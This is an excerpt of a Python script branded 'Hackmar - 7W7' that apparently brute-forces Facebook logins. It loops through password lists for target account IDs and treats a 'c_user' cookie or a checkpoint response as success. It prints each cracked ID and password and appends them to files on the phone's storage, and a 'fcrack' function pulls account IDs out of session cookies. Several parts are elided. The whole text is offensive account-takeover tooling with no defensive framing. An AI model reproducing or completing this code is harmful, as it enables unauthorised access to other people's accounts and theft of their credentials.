...
try:
	...
	os.system('python open-sourse-7W7.py')
ugen = []
...
logo = ("""\033[1;97m
   8888888888      888       888      8888888888 
         d88P      888   o   888            d88P 
        d88P       888  d8b  888           d88P  
       d88P        888 d888b 888          d88P
    88888888       888d88888b888       88888888
     d88P          88888P Y88888        d88P╭━━━━━━━╮
    d88P           8888P   Y8888       d88P ┃HACKMAR┃
   d88P            888P     Y888      d88P \033[1;97m ╰━━━━━━━╯\033[1;34m """)
def linex():
	print('\033[0;97m------------------------------------------------')
loop = 0
oks = []
...
def fia():    
			print(logo)
			print('\x1b[1;97m>>> Gift From Hackmar - 7W7')
			linex()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[0;97m[7W7-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/Hackmar-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[7W7-OK] '+ids+' | '+pas+'\033[0;92m')
					
					open('/sdcard/Hackmar-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[0;92m[Hackmar] %s|\033[1;92mOK:-%s \033[0;92m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[0;92m[7W7-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;97m[7W7-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
    ...
    'x_fb_background_state': '1',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[7W7-CP] '+cid+' | '+ps+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[7W7-OK] '+cid+' | '+ps+'\033[0;92m')
